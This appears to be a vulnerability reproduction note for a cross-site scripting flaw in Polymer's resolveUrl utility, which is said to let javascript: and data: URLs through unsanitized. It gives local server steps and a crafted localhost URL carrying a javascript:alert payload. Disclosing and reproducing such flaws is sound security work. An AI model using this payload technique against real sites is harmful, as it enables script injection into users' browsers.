Polymer XSS Reproduction: URL Resolution Bypass

This PoC demonstrates a logic bypass in Polymer's resolveUrl utility, which fails to filter executable protocol schemes (e.g., javascript:, data:).

Reproduction steps:
  1. Start a web server in C:\polymer\:
    python -m http.server 8081
  2. Navigate to the PoC URL (assuming this file is in C:\polymer\poc\):
    http://localhost:8081/poc/real-poc.html?url=javascript:alert('XSS_SUCCESS_URL_BYPASS')
  3. Click the "Click for XSS" link above.

Result: Arbitrary JavaScript executes because the ABS_URL regex in Polymer allows any word followed by a colon as an "absolute URL" without sanitization.
